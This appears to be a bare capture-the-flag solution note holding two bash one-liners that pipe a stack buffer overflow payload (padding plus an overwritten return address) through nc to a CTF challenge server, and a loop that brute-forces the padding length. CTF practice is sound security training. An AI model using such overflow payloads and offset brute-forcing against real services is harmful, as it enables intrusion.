#exploit

```bash
python2 -c "print 'a'*40+'\x08\x07\x40\x00\x00\x00\x00\x00'" | nc pwn.zh3r0.ml 3456
```


#bf the overflow

```bash
for i in {30..45}; do echo $i; python2 -c "print 'a'*$i+'\x08\x07\x40\x00\x00\x00\x00\x00'" | nc pwn.zh3r0.ml 3456 ; done
```
